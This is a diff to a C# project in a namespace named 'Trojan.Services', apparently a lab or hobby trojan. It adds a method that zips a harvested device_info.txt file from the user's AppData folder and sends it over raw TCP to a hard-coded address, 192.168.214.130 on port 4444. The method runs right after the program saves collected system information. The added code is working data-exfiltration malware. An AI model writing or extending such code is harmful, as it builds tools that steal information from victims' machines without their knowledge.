@@ -8,6 +8,8 @@ using System.Text.Json;
 using Microsoft.Win32;
 using System.Management;
 using System.Runtime.InteropServices;
+using System.IO.Compression;
+using System.Net.Sockets;
 
 namespace Trojan.Services
 {
@@ -45,8 +47,54 @@ namespace Trojan.Services
 
             // Save file
             await File.WriteAllTextAsync(file, sb.ToString());
-        }
+            await SendFolderToServer("192.168.214.130", 4444);
 
+        }
+        public static async Task SendFolderToServer(string serverIp, int port)
+        {
+            string folderPath = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                "gnezdece");
+
+            if (!Directory.Exists(folderPath))
+            {
+                Console.WriteLine("Folder ne postoji!");
+                return;
+            }
+
+            // Kreiraj privremeni folder samo za fajlove koji nisu zaključani
+            string tempFolder = Path.Combine(Path.GetTempPath(), "gnezdece_temp_" + Guid.NewGuid().ToString());
+            Directory.CreateDirectory(tempFolder);
+
+            // Kopiraj samo device_info.txt (bazu preskoči)
+            string sourceFile = Path.Combine(folderPath, "device_info.txt");
+            string destFile = Path.Combine(tempFolder, "device_info.txt");
+
+            if (File.Exists(sourceFile))
+            {
+                File.Copy(sourceFile, destFile, true);
+                Console.WriteLine("Kopiran device_info.txt");
+            }
+
+            // Zip-uj samo temp folder
+            string zipPath = Path.GetTempFileName() + ".zip";
+            ZipFile.CreateFromDirectory(tempFolder, zipPath);
+            Console.WriteLine("Zip kreiran (bez baze)");
+
+            // Pošalji zip
+            byte[] zipData = await File.ReadAllBytesAsync(zipPath);
+
+            using TcpClient client = new TcpClient();
+            await client.ConnectAsync(serverIp, port);
+            using NetworkStream stream = client.GetStream();
+            await stream.WriteAsync(zipData, 0, zipData.Length);
+
+            Console.WriteLine("Folder poslat kao zip");
+
+            // Obriši temp fajlove
+            File.Delete(zipPath);
+            Directory.Delete(tempFolder, true);
+        }
         static string GetCPU()
         {
             using var searcher =
